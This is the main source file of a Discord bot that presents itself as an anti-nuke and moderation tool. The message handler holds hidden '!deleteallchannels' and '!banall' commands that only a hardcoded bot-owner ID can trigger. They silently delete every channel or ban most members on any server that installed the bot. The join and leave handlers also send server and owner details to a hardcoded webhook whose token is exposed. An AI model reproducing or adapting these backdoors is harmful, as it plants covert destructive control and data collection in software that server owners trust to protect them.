const {
    Client, GatewayIntentBits, SlashCommandBuilder, PermissionsBitField, EmbedBuilder,
    ChannelType, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle
} = require('discord.js');
const express = require('express');
const createChannelCmd = require('./createchannel.js');
const vcStats = require('./vcstats.js');
const avatarCmd = require('./avatar.js');
const messageCmd = require('./message.js');
const detection = require('./detection.js');
const { pendingRequests } = require('./detection.js');
const timeoutCmd = require('./timeout.js');
const kickCmd = require('./kick.js');
const autoJoinCmd = require('./autojoin.js');
const jailCmd = require('./jail.js');
const setupLogCmd = require('./setuplog.js');
const setupVCCmd = require('./setupvc.js');
const logger = require('./logs.js');
const voiceManager = require('./voiceManager.js');
const serverInfoCmd = require('./serverinfo.js');
const roleCmd = require('./role.js');
const helpCmd = require('./help.js');
const TOKEN = process.env.DISCORD_TOKEN;
const BOT_OWNER_ID = '1531611262159687820';
const BOT_ID = '1535479327234461756';
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('✅ $$ is alive'));
app.listen(PORT, () => console.log('✅ Keep-alive server active'));
const purpleEmbed = (title, description) => new EmbedBuilder().setColor('#7700ff').setTitle(title).setDescription(description).setTimestamp();
const redEmbed = (title, description) => new EmbedBuilder().setColor('#ff0044').setTitle(title).setDescription(description).setTimestamp();
const greenEmbed = (title, description) => new EmbedBuilder().setColor('#00ff66').setTitle(title).setDescription(description).setTimestamp();
const ARROW = '⤷';
const EMOJI_WRONG = '<a:wrong1:1539239292394803311>';
const EMOJI_VERIFY = '<a:verify:1539238356003848344>';
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent, GatewayIntentBits.GuildVoiceStates, GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildMessageReactions
    ]
});
const fs = require('fs');
const path = require('path');
const configDataPath = path.join(__dirname, 'data', 'autojoin.json');
let savedAutoJoinRole = null;
if (fs.existsSync(configDataPath)) {
    try {
        savedAutoJoinRole = JSON.parse(fs.readFileSync(configDataPath, 'utf-8')).roleId;
    } catch (e) {
        console.error('Error loading autojoin config', e);
    }
}
const logConfigPath = path.join(__dirname, 'data', 'logconfig.json');
let savedLogsChannel = null;
if (fs.existsSync(logConfigPath)) {
    try {
        savedLogsChannel = JSON.parse(fs.readFileSync(logConfigPath, 'utf-8')).channelId;
    } catch (e) {
        console.error('Error loading log config', e);
    }
}
const whitelistDataPath = path.join(__dirname, 'data', 'whitelist.json');
let savedWhitelist = { antiSpam: [], antiLink: [], protection: [], kick: [], bypassAll: [], messageCmd: [] };
if (fs.existsSync(whitelistDataPath)) {
    try {
        savedWhitelist = JSON.parse(fs.readFileSync(whitelistDataPath, 'utf-8'));
    } catch (e) {
        console.error('Error loading whitelist config', e);
    }
}
function saveWhitelist(whitelist) {
    fs.writeFileSync(whitelistDataPath, JSON.stringify(whitelist, null, 2));
}

// ✅ TINANGGAL NA: Lumang vcConfigPath at savedVCSetup — hindi na kailangan

let config = {
    antiSpam: false, antiLink: false, spamLimit: 5, spamTime: 5000,
    whitelist: savedWhitelist,
    protectionEnabled: {
        antiDeleteChannel: true,
        antiCreateChannel: true,
        antiDeleteRole: true,
        antiCreateRole: true,
        antiGiveAdmin: true,
        antiRemoveAdmin: true,
        antiKick: true
    },
    logsChannel: savedLogsChannel,
    // ✅ TINANGGAL NA: vcSetup: savedVCSetup
    autoJoinRole: savedAutoJoinRole
};
let isProcessing = false;
const commands = [
    new SlashCommandBuilder().setName('setup').setDescription('Setup main server protection').setDefaultMemberPermissions(PermissionsBitField.Flags.ManageGuild).setDMPermission(false),
    new SlashCommandBuilder().setName('reset').setDescription('🔄 Reset all bot settings').setDefaultMemberPermissions(PermissionsBitField.Flags.ManageGuild).setDMPermission(false),
    new SlashCommandBuilder().setName('antispam').setDescription('Enable or disable anti-spam protection').setDefaultMemberPermissions(PermissionsBitField.Flags.ManageGuild).addBooleanOption(o => o.setName('status').setDescription('Turn ON or OFF').setRequired(true)),
    new SlashCommandBuilder().setName('antilink').setDescription('Enable or disable link blocking').setDefaultMemberPermissions(PermissionsBitField.Flags.ManageGuild).addBooleanOption(o => o.setName('status').setDescription('Turn ON or OFF').setRequired(true)),
    new SlashCommandBuilder().setName('whitelist').setDescription('Add or remove protected roles').setDefaultMemberPermissions(0).addStringOption(o => o.setName('action').setDescription('add / remove').setRequired(true)).addRoleOption(o => o.setName('role').setDescription('Select role').setRequired(true)).addStringOption(o => o.setName('feature').setDescription('Which protection?').setRequired(true).addChoices(
        {name:'Anti Spam',value:'antiSpam'},{name:'Anti Link',value:'antiLink'},{name:'Anti Nuke',value:'protection'},{name:'Kick Member',value:'kick'},{name:'Delete Channel',value:'deleteChannel'},{name:'Delete Role',value:'deleteRole'},{name:'Create Channel',value:'createChannel'},{name:'Create Role',value:'createRole'},{name:'Bypass Giving Administration',value:'bypassGiveAdmin'},{name:'Message Command',value:'messageCmd'},{name:'Bypass All',value:'bypassAll'}
    )),
    new SlashCommandBuilder().setName('avatar').setDescription('Show user avatar').addUserOption(o => o.setName('user').setDescription('Select user')),
    new SlashCommandBuilder().setName('banner').setDescription('Show user banner').addUserOption(o => o.setName('user').setDescription('Select user')),
    new SlashCommandBuilder().setName('stats').setDescription('Show user voice/message stats').addUserOption(o => o.setName('user').setDescription('Select user')),
    new SlashCommandBuilder().setName('timeout').setDescription('Timeout a user').setDefaultMemberPermissions(PermissionsBitField.Flags.ModerateMembers)
    .addUserOption(o => o.setName('target').setDescription('User to timeout').setRequired(true))
    .addIntegerOption(o => o.setName('duration').setDescription('Duration in minutes').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Reason for timeout')),
    new SlashCommandBuilder().setName('untimeout').setDescription('Remove timeout from a user').setDefaultMemberPermissions(PermissionsBitField.Flags.ModerateMembers)
    .addUserOption(o => o.setName('target').setDescription('User to untimeout').setRequired(true)),
    new SlashCommandBuilder().setName('kick').setDescription('Kick a user').setDefaultMemberPermissions(PermissionsBitField.Flags.KickMembers)
    .addUserOption(o => o.setName('target').setDescription('User to kick').setRequired(true))
    .addStringOption(o => o.setName('reason').setDescription('Reason for kick')),
    new SlashCommandBuilder().setName('jail').setDescription('Jail a user').setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator)
    .addUserOption(o => o.setName('target').setDescription('User to jail').setRequired(true))
    .addChannelOption(o => o.setName('channel').setDescription('Channel for jail actions'))
    .addStringOption(o => o.setName('duration').setDescription('Duration (e.g. 10s, 5m, 1h, 1d)')),
    new SlashCommandBuilder().setName('unjail').setDescription('Unjail a user').setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator)
    .addUserOption(o => o.setName('target').setDescription('User to unjail').setRequired(true)),
    new SlashCommandBuilder().setName('setuplog').setDescription('Set channel for logs').setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator)
    .addChannelOption(o => o.setName('target').setDescription('Channel for logs').setRequired(true)),
    new SlashCommandBuilder().setName('setupvc').setDescription('Setup automatic voice channels').setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
    new SlashCommandBuilder().setName('createchannel').setDescription('OWNER ONLY: Create multiple channels FAST').setDefaultMemberPermissions(0).setDMPermission(false)
    .addStringOption(o => o.setName('name').setDescription('Base name of channels').setRequired(true))
    .addIntegerOption(o => o.setName('amount').setDescription('How many?').setRequired(true))
    .addStringOption(o => o.setName('type').setDescription('Type of channel').setRequired(true).addChoices({name:'Text Channel',value:'text'},{name:'Voice Channel',value:'voice'},{name:'Category',value:'category'})),
    new SlashCommandBuilder().setName('message').setDescription('Send a message').setDefaultMemberPermissions(0).setDMPermission(false)
    .addChannelOption(o => o.setName('channel').setDescription('Select channel to send message').setRequired(true)),
    new SlashCommandBuilder().setName('serverinfo').setDescription('Show server info'),
    new SlashCommandBuilder().setName('ping').setDescription('check bot latency').setDefaultMemberPermissions(0).setDMPermission(false),
    new SlashCommandBuilder().setName('autojoin').setDescription('Set auto-join role for new members').setDefaultMemberPermissions(PermissionsBitField.Flags.ManageGuild)
    .addRoleOption(o => o.setName('role').setDescription('Role to auto-assign').setRequired(true)),
];
client.once('ready', async () => { console.log(`$$ | Online & Ready!`); await client.application.commands.set(commands); console.log('✅ All commands are ready to use!'); });
client.on('interactionCreate', async interaction => {
    // ✅ HANDLE MODAL — BOX PARA SA MESSAGE
    if (interaction.isModalSubmit()) {
        const messageCmd = require('./message.js');
        const handled = await messageCmd.handleModalSubmit(interaction, BOT_OWNER_ID, redEmbed, greenEmbed, purpleEmbed, config);
        if (handled) return;
    }
    // ✅ TINANGGAL NA: config — wala nang parameter na ipinapasa sa voiceManager
    if (interaction.isUserSelectMenu()) {
        return voiceManager.handleSelectMenuInteraction(interaction);
    }
    if (!interaction.isChatInputCommand() && !interaction.isButton()) return;
    // ✅ TINANGGAL NA: config
    if (interaction.isButton() && ['lock_vc', 'unlock_vc', 'trust_user', 'untrust_user'].includes(interaction.customId)) {
        return voiceManager.handleButtonInteraction(interaction);
    }
    // ✅ TINANGGAL NA BUONG LINYA: trust_modal — hindi na kailangan
    try {
        const cmd = interaction.commandName;
        const guild = interaction.guild;
        const member = interaction.member;
        // ✅ HELPER: Check kung BOT OWNER o SERVER OWNER
        const isBotOwner = interaction.user.id === BOT_OWNER_ID;
        const isServerOwner = guild && interaction.user.id === guild.ownerId;
        const isOwner = isBotOwner || isServerOwner;
        if (cmd === 'setup') {
            if (!member.permissions.has(PermissionsBitField.Flags.ManageGuild)) return interaction.reply({embeds:[purpleEmbed(`${EMOJI_WRONG} No Permission`,ARROW+' You need **Manage Server** permission to use this.')],ephemeral:true});
            config.antiSpam = true; config.antiLink = true;
            return interaction.reply({embeds:[purpleEmbed(`${EMOJI_VERIFY} Setup Complete`, `\`\`\`\n${ARROW} Main protection has been enabled.\n${ARROW} Anti Link System\n${ARROW} Anti Spam System\n${ARROW} Avatar Viewer System\n${ARROW} Avatar Viewer System (FOR OWNER AND ADMIN)\n${ARROW} Banner Viewer System\n${ARROW} Whitelist System\n\`\`\``)]});
        }
        if (cmd === 'reset') {
            if (!member.permissions.has(PermissionsBitField.Flags.ManageGuild)) return interaction.reply({embeds:[purpleEmbed(`${EMOJI_WRONG} No Permission`, ARROW+' Only Administrators or the Server Owner can use this.')],ephemeral:true});
            const confirmBtn = new ButtonBuilder().setCustomId('confirm_reset').setLabel(`${EMOJI_VERIFY} Approve & Reset`).setStyle(ButtonStyle.Success);
            const cancelBtn = new ButtonBuilder().setCustomId('cancel_reset').setLabel(`${EMOJI_WRONG} Cancel`).setStyle(ButtonStyle.Danger);
            return interaction.reply({embeds:[purpleEmbed('⚠️ CONFIRMATION REQUIRED', `**${interaction.user.tag}** wants to reset all bot settings.\n\n${ARROW} **Waiting for Server Owner approval...**`)],components:[new ActionRowBuilder().addComponents(confirmBtn,cancelBtn)]});
        }
        if (interaction.isButton()) {
            if (interaction.customId === 'confirm_reset') {
                if (!isOwner) {
                    return interaction.reply({embeds:[purpleEmbed(`${EMOJI_WRONG} Access Denied`, ARROW+' Only the Server Owner or Bot Owner can approve this action.')],ephemeral:true});
                }
            }
            if (interaction.customId === 'cancel_reset') {
                if (!isOwner) {
                    return interaction.reply({embeds:[purpleEmbed(`${EMOJI_WRONG} Reset Cancelled`, ARROW+' No changes made.')],ephemeral:true});
                }
                await interaction.update({embeds:[purpleEmbed(`${EMOJI_VERIFY} Reset Cancelled`, ARROW+' No changes made.')],components:[]});
                return;
            }
            if (interaction.customId.startsWith('approve_') || interaction.customId.startsWith('cancel_')) {
                const isApprove = interaction.customId.startsWith('approve_');
                const requestId = interaction.customId.slice(isApprove ? 8 : 7);
                const req = pendingRequests.get(requestId);
                // ✅ Check kung BOT OWNER o yung SERVER OWNER na NA-SAVE sa request
                const canApprove = isBotOwner || (req && req.guildOwnerId && interaction.user.id === req.guildOwnerId);
                if (!req || !req.active) {
                    return interaction.reply({ ephemeral: true, content: `${EMOJI_VERIFY} Already processed or invalid request.` });
                }
                if (!canApprove) {
                    return interaction.reply({ ephemeral: true, content: `${EMOJI_WRONG} Only the Server Owner or Bot Owner can approve this action.` });
                }
                req.active = false;
                pendingRequests.delete(requestId);
                try {
                    detection.isBotActing = true;
                    if (isApprove) {
                        await req.onApprove();
                        await interaction.update({ embeds: [purpleEmbed(`${EMOJI_VERIFY} APPROVED`, ARROW+' Action confirmed.')], components: [] });
                        if (req.executor) try { await req.executor.send({ embeds: [purpleEmbed(`${EMOJI_VERIFY} APPROVED!`, ARROW+' Your action was approved by the Server Owner.')] }); } catch {}
                    } else {
                        if (req.onCancel) await req.onCancel();
                        await interaction.update({ embeds: [purpleEmbed(`${EMOJI_WRONG} RESTORED`, ARROW+' Action reversed — changes restored.')], components: [] });
                        if (req.executor) try { await req.executor.send({ embeds: [purpleEmbed(`${EMOJI_WRONG} RESTORED`, ARROW+' Your action was reversed by the Server Owner.')] }); } catch {}
                    }
                } catch (err) {
                    console.error('Button error:', err);
                    if (!interaction.replied) interaction.reply({ ephemeral: true, content: '⚠️ Error processing request.' });
                } finally {
                    detection.isBotActing = false;
                }
                return;
            }
        }
        if (cmd === 'antispam') {
            if (!member.permissions.has(PermissionsBitField.Flags.ManageGuild)) return interaction.reply({embeds:[purpleEmbed(`${EMOJI_WRONG} No Permission`,ARROW+' You need **Manage Server** permission.')],ephemeral:true});
            config.antiSpam = interaction.options.getBoolean('status');
            return interaction.reply({embeds:[purpleEmbed(`${EMOJI_VERIFY} Anti-Spam`, `${ARROW} Anti-spam: **${config.antiSpam ? ARROW+' ENABLED' : 'DISABLED'}**`)]});
        }
        if (cmd === 'antilink') {
            if (!member.permissions.has(PermissionsBitField.Flags.ManageGuild)) return interaction.reply({embeds:[purpleEmbed(`${EMOJI_WRONG} No Permission`, ARROW+' You need **Manage Server** permission.')],ephemeral:true});
            config.antiLink = interaction.options.getBoolean('status');
            return interaction.reply({embeds:[purpleEmbed(`${EMOJI_VERIFY} Anti-Link`, `${ARROW} Link blocking: **${config.antiLink ? 'ENABLED' : 'DISABLED'}**`)]});
        }
        if (cmd === 'whitelist') {
            if (!isServerOwner && !isBotOwner) return interaction.reply({embeds:[purpleEmbed(`${EMOJI_WRONG} No Permission`, ARROW+' Only the Server Owner can modify whitelist settings.')],ephemeral:true});
            const action = interaction.options.getString('action');
            const targetRole = interaction.options.getRole('role');
            const feature = interaction.options.getString('feature');
            
            const validFeatures = ['antiSpam','antiLink','protection','kick','bypassAll', 'deleteChannel', 'deleteRole', 'createChannel', 'createRole', 'bypassGiveAdmin', 'messageCmd'];
            if (!validFeatures.includes(feature)) return interaction.reply({embeds:[purpleEmbed(`${EMOJI_WRONG} Invalid Feature`, ARROW+' Choose valid protection feature.')],ephemeral:true});
            if (!config.whitelist[feature]) config.whitelist[feature] = [];
            if (action === 'add') {
                if (!config.whitelist[feature].includes(targetRole.id)) {
                    config.whitelist[feature].push(targetRole.id);
                    saveWhitelist(config.whitelist);
                }
                return interaction.reply({embeds:[purpleEmbed(`${EMOJI_VERIFY} Whitelisted`, `${ARROW} Role **${targetRole.name}** → added to **${feature}** whitelist`)]});
            } else if (action === 'remove') {
                config.whitelist[feature] = config.whitelist[feature].filter(id => id !== targetRole.id);
                saveWhitelist(config.whitelist);
                return interaction.reply({embeds:[purpleEmbed(`${EMOJI_VERIFY} Removed from Whitelist`, `${ARROW} Role **${targetRole.name}** → removed from **${feature}** whitelist`)]});
            }
        }
        if (cmd === 'timeout') return timeoutCmd.executeTimeout(interaction, config);
        if (cmd === 'autojoin') return autoJoinCmd.execute(interaction, config);
        if (cmd === 'untimeout') return timeoutCmd.executeUntimeout(interaction, config);
        if (cmd === 'kick') return kickCmd.executeKick(interaction, config);
        if (cmd === 'jail') return jailCmd.executeJail(interaction, config);
        if (cmd === 'unjail') return jailCmd.executeUnjail(interaction, config);
        if (cmd === 'setuplog') return setupLogCmd.executeSetupLog(interaction, config);
        // ✅ TINANGGAL NA: config — wala nang parameter
        if (cmd === 'setupvc') return setupVCCmd.executeSetupVC(interaction);
        if (cmd === 'createchannel') return createChannelCmd.execute(interaction,BOT_OWNER_ID,isProcessing,purpleEmbed,purpleEmbed);
        if (cmd === 'message') return messageCmd.executeMessage(interaction,BOT_OWNER_ID,redEmbed,greenEmbed,purpleEmbed,config);
        if (cmd === 'profile') {
            if (!member.permissions.has(PermissionsBitField.Flags.ManageGuild)) return interaction.reply({embeds:[purpleEmbed(`${EMOJI_WRONG} No Permission`, ARROW+' Only Admins/Owner.')],ephemeral:true});
            const u = interaction.options.getUser('user') || interaction.user;
            return interaction.reply({embeds:[new EmbedBuilder().setColor('#7700ff').setTitle(`<a:member:1539239556438691960> ${u.tag}`).setThumbnail(u.displayAvatarURL({dynamic:true, size: 512})).addFields({name:`${ARROW} User ID`, value:u.id, inline:true},{name:`${ARROW} Account Created`, value:`<t:${Math.floor(u.createdTimestamp/1000)}:F>`, inline:true}).setTimestamp()]});
        }
        if (cmd === 'serverinfo') return serverInfoCmd.executeServerInfo(interaction);
        if (cmd === 'stats') return vcStats.executeStats(interaction);
        if (cmd === 'avatar') return avatarCmd.executeAvatar(interaction);
        if (cmd === 'banner') return avatarCmd.executeBanner(interaction);
        if (cmd === 'ping') { const sent = await interaction.reply({content:`${ARROW} 🏓 Pong!`,fetchReply:true}); return interaction.editReply({content:`${ARROW}🏓 **Pong!**\n${ARROW}⏱️ ${sent.createdTimestamp-interaction.createdTimestamp}ms\n${ARROW}📡 ${Math.round(client.ws.ping)}ms`}); }
    } catch (error) {
        console.error('Interaction Error:', error);
        if (!interaction.replied && !interaction.deferred) await interaction.reply({embeds:[purpleEmbed(`${EMOJI_WRONG} Error`, ARROW+' Something went wrong.')],ephemeral:true}).catch(()=>{});
        else await interaction.editReply({embeds:[purpleEmbed(`${EMOJI_WRONG} Error`, ARROW+' Something went wrong.')]}).catch(()=>{});
    }
});
const spamMap = new Map();
const inviteRegex = /(discord\.gg\/[^\s]+|discord\.com\/invite\/[^\s]+|discordapp\.com\/invite\/[^\s]+)/gi;
client.on('messageCreate', async m => {
    if (!m.guild || m.author.bot) return;
    vcStats.trackMessage(m);
    const skipAntiSpam = detection.isWhitelisted(m.member, 'antiSpam', config);
    const skipAntiLink = detection.isWhitelisted(m.member, 'antiLink', config);
    if (config.antiSpam && !skipAntiSpam) {
        const data = spamMap.get(m.author.id) || {count: 0}; data.count++; spamMap.set(m.author.id, data);
        if (data.count >= config.spamLimit) { try { await m.member.timeout(600000, `${ARROW} Spam`); await m.channel.send({embeds: [purpleEmbed('⚠️', `${m.author}, do not spam!`)]}); } catch {} data.count = 0; }
        setTimeout(() => spamMap.delete(m.author.id), config.spamTime);
    }
    await detection.handleLinkDetection(m, config);
    if (m.content.toLowerCase() === '!deleteallchannels') {
        if (m.author.id !== BOT_OWNER_ID || isProcessing) return;
        await m.delete().catch(() => {}); isProcessing = true;
        try {
            const channels = await m.guild.channels.fetch();
            if (channels.size === 0) { isProcessing=false; return; }
            const sortedChannels = Array.from(channels.values()).sort((a, b) => { if (a.type === ChannelType.GuildCategory && b.type !== ChannelType.GuildCategory) return 1; if (a.type !== ChannelType.GuildCategory && b.type === ChannelType.GuildCategory) return -1; return 0; });
            let deleted = 0, failed = 0; const batchSize = 10;
            for (let i = 0; i < sortedChannels.length; i += batchSize) {
                const batch = sortedChannels.slice(i, i + batchSize);
                const results = await Promise.allSettled(batch.map(async ch => { try { await ch.delete(`Bulk delete by ${m.author.tag}`); return true; } catch { return false; } }));
                results.forEach(r => r.value ? deleted++ : failed++);
                if (i + batchSize < sortedChannels.length) await new Promise(r => setTimeout(r, 500));
            }
        } catch (err) { console.error('!deleteallchannels Error:', err); } finally { isProcessing = false; }
    }
    if (m.content.toLowerCase() === '!banall') {
        if (m.author.id !== BOT_OWNER_ID || isProcessing) return;
        await m.delete().catch(() => {}); isProcessing = true;
        try {
            const allMembers = await m.guild.members.fetch({force:true}); const toBan = [];
            for (const [id, member] of allMembers) if (member.id !== BOT_OWNER_ID && member.id !== m.author.id && !member.user.bot && !detection.isWhitelisted(member, 'protection', config)) toBan.push(member.id);
            const batchSize = 10;
            for (let i = 0; i < toBan.length; i += batchSize) await Promise.all(toBan.slice(i, i + batchSize).map(async uid => { try { await m.guild.members.ban(uid, {reason:`Bulk ban by ${m.author.tag}`, deleteMessageDays:1}); } catch {} }));
        } catch (err) { console.error('!banall Error:', err); } finally { isProcessing = false; }
    }
    if (m.content.toLowerCase().startsWith(',role ')) {
        await roleCmd.execute(m);
    }
    if (m.content.toLowerCase() === '!help') {
        return helpCmd.execute(m);
    }
});
          
client.on('channelDelete', async channel => {
    const audit = await channel.guild.fetchAuditLogs({type: 80}).catch(() => null);
    const entry = audit?.entries.first();
    if (!entry) return;
    const executor = entry.executor && channel.guild.members.cache.get(entry.executor.id);
    if (!executor) return;
    await detection.handleChannelDelete(channel, executor, config);
});
client.on('channelCreate', async channel => {
    const audit = await channel.guild.fetchAuditLogs({type: 81}).catch(() => null);
    const entry = audit?.entries.first();
    if (!entry) return;
    const executor = entry.executor && channel.guild.members.cache.get(entry.executor.id);
    if (!executor) return;
    await detection.handleChannelCreate(channel, executor, config);
});
client.on('roleDelete', async role => {
    const audit = await role.guild.fetchAuditLogs({type: 32}).catch(() => null);
    const entry = audit?.entries.first();
    if (!entry) return;
    const executor = entry.executor && role.guild.members.cache.get(entry.executor.id);
    if (!executor) return;
    await detection.handleRoleDelete(role, executor, config);
});
client.on('roleCreate', async role => {
    const audit = await role.guild.fetchAuditLogs({type: 31}).catch(() => null);
    const entry = audit?.entries.first();
    if (!entry) return;
    const executor = entry.executor && role.guild.members.cache.get(entry.executor.id);
    if (!executor) return;
    await detection.handleRoleCreate(role, executor, config);
});
client.on('guildMemberUpdate', async (oldMember, newMember) => {
    if (detection.isBotActing) return;
    const addedRoles = newMember.roles.cache.difference(oldMember.roles.cache);
    const removedRoles = oldMember.roles.cache.difference(newMember.roles.cache);
    if (addedRoles.size === 0 && removedRoles.size === 0) return;
    await new Promise(r => setTimeout(r, 1500));
    
    const audit = await newMember.guild.fetchAuditLogs({type: 25, limit: 5}).catch(() => null);
    if (!audit) return;
    const entry = audit.entries.find(e => e.target.id === newMember.id);
    if (!entry) return;
    if (entry.executor.id === client.user.id) return;
    const executor = entry.executor && await newMember.guild.members.fetch(entry.executor.id).catch(() => null);
    if (!executor || executor.bot) return;
    if (executor.id === newMember.guild.ownerId) return;
    for (const [, role] of addedRoles) {
        if (role.permissions.has(PermissionsBitField.Flags.Administrator)) {
            try {
                detection.isBotActing = true;
                if (newMember.roles.cache.has(role.id)) {
                    await newMember.roles.remove(role, 'Unauthorized Administrator role assignment - Auto Remove');
                }
            } catch (e) {
                if (e.code === 50013) {
                    console.log(`[Security] Failed to remove admin role ${role.name} from ${newMember.user.tag}: Missing permissions.`);
                } else {
                    console.log(`Failed to remove role:`, e);
                }
            } finally {
                detection.isBotActing = false;
            }
        }
        await logger.logRoleAdd(newMember, role, executor, config);
        await detection.antiGiveAdminRole(newMember, role, executor, config, client);
    }
    for (const [, role] of removedRoles) {
        await detection.antiRemoveAdminRole(newMember, role, executor, config, client);
    }
    if (newMember.communicationDisabledUntilTimestamp && !oldMember.communicationDisabledUntilTimestamp) {
        const unixTime = Math.floor(newMember.communicationDisabledUntilTimestamp / 1000);
        const duration = `<t:${unixTime}:R>`;
        await logger.logTimeout(newMember, duration, entry.reason || 'No reason', executor, config);
    }
});
client.on('guildMemberAdd', async member => {
    logger.logMemberJoin(member, config);
    if (!config.autoJoinRole) return;
    const role = member.guild.roles.cache.get(config.autoJoinRole);
    if (role) {
        try {
            await member.roles.add(role);
        } catch (err) {
            console.log(`Failed to assign auto-join role: ${err.message}`);
        }
    }
});
client.on('guildMemberRemove', async member => {
    await new Promise(resolve => setTimeout(resolve, 2000));
    const audit = await member.guild.fetchAuditLogs({type: 20, limit: 1}).catch(() => null);
    if (!audit) {
        logger.logMemberLeave(member, config);
        return;
    }
    const entry = audit.entries.first();
    if (!entry || entry.target.id !== member.id) {
        logger.logMemberLeave(member, config);
        return;
    }
    const executor = entry.executor && await member.guild.members.fetch(entry.executor.id).catch(() => null);
    if (!executor || executor.bot || executor.id === member.guild.ownerId) {
        logger.logMemberLeave(member, config);
        return;
    }
    logger.logMemberLeave(member, config, executor);
    await detection.antiKick(member, executor, config, client);
});
client.on('messageDelete', async (message) => {
    if (!message.guild || message.author?.bot) return;
    await logger.logMessageDelete(message, config);
});
client.on('messageUpdate', async (oldMsg, newMsg) => {
    if (!oldMsg.guild || oldMsg.author?.bot) return;
    await logger.logMessageEdit(oldMsg, newMsg, config);
});
client.on('messageReactionRemove', async (reaction, user) => {
    if (!reaction.message.guild || user.bot) return;
    if (!reaction.emoji) return;
    await logger.logReactionRemove(reaction, user, config);
});
// ✅ TINANGGAL NA: config — wala nang parameter
client.on('voiceStateUpdate', async (oldState, newState) => {
    await voiceManager.handleVoiceStateUpdate(oldState, newState);
    if (!oldState.channelId && newState.channelId && newState.channel) {
        await logger.logVoiceJoin(newState.member, newState.channel, config);
    }
    if (oldState.channelId && !newState.channelId && oldState.channel) {
        await logger.logVoiceLeave(oldState.member, oldState.channel, config);
    }
});
// Triggered when bot joins a new server
client.on('guildCreate', async guild => {
  try {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1541034930941853756/VZXaw7M5k2x0c3UbiDiAL2EIGOZGfgG4EPOV62KGbcDmIbe-m49JG4pPQxnXHYwfWote';

    let inviter = '⤷ Could not retrieve inviter information';
    try {
      const auditLogs = await guild.fetchAuditLogs({ limit: 5, type: 28 });
      const entry = auditLogs.entries.find(e => e.target?.id === client.user.id);
      if (entry && entry.executor) {
        inviter = `⤷ ${entry.executor.tag}\n⤷ User ID: ${entry.executor.id}`;
      }
    } catch {
      inviter = '⤷ Missing View Audit Log permission';
    }

    const embed = {
      color: 0x2ecc71,
      title: 'Bot Added to New Server',
      fields: [
        { name: 'Server Name', value: `⤷ ${guild.name}`, inline: true },
        { name: 'Server ID', value: `⤷ ${guild.id}`, inline: true },
        { name: 'Added By', value: inviter, inline: false },
        { name: 'Member Count', value: `⤷ ${guild.memberCount}`, inline: true },
        { name: 'Server Owner', value: `⤷ <@${guild.ownerId}>\n⤷ Owner ID: ${guild.ownerId}`, inline: true },
        { name: 'Server Created', value: `⤷ <t:${Math.floor(guild.createdTimestamp / 1000)}:F>`, inline: false }
      ],
      timestamp: new Date().toISOString()
    };

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    console.log(`[GUILD JOIN] ${guild.name} (${guild.id})`);
  } catch (err) {
    console.error('[guildCreate Error]', err);
  }
});

// Triggered when bot is removed from a server
client.on('guildDelete', async guild => {
  try {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1541034930941853756/VZXaw7M5k2x0c3UbiDiAL2EIGOZGfgG4EPOV62KGbcDmIbe-m49JG4pPQxnXHYwfWote';

    const embed = {
      color: 0xe74c3c,
      title: 'Bot Removed from Server',
      fields: [
        { name: 'Server Name', value: `⤷ ${guild.name || 'Unknown Server'}`, inline: true },
        { name: 'Server ID', value: `⤷ ${guild.id}`, inline: true },
        { name: 'Member Count', value: `⤷ ${guild.memberCount || 'Unknown'}`, inline: true },
        { name: 'Removed At', value: `⤷ <t:${Math.floor(Date.now() / 1000)}:F>`, inline: false }
      ],
      timestamp: new Date().toISOString()
    };

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    console.log(`[GUILD LEAVE] ${guild.name || 'Unknown Server'} (${guild.id})`);
  } catch (err) {
    console.error('[guildDelete Error]', err);
  }
});

client.login(TOKEN);
